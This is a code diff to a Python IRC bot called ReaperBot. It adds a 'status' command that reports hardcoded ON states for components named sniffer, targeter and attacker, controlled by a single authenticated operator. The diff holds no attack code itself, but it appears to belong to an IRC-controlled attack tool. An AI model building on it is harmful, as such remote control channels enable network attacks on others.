@@ -49,8 +49,9 @@ class ReaperBot(irc.IRCClient):
             self.display_help()
             return
 
+        if command == "status":
+            self.display_status()
 
-        self.msg(channel, "That's so interesting master, tell me more")
 
     # Handles the authentication of a user.
     # Only one user can be authenticated, and is therefor able to issue commands
@@ -68,6 +69,18 @@ class ReaperBot(irc.IRCClient):
         self.msg(self.channel, "status   | Displays the status of the sniffer, targeter and attacker")
         return
 
+    def display_status(self):
+        sniffer_status = True
+        targeter_status = True
+        attacker_status = True
+
+        self.msg(self.channel, "sniffer    : %s" % ("ON" if sniffer_status else "OFF"))
+        self.msg(self.channel, "targeter   : %s" % ("ON" if targeter_status else "OFF"))
+        self.msg(self.channel, "attacker   : %s" % ("ON" if attacker_status else "OFF"))
+        return
+
+
+
 
 
 class BotFactory(protocol.ClientFactory):
@@ -83,6 +96,10 @@ class BotFactory(protocol.ClientFactory):
 
     def clientConnectionFailed(self, connector, reason):
         print "Could not connect: %s" % (reason,)
+
+
+
+
 
 
 if __name__ == "__main__":
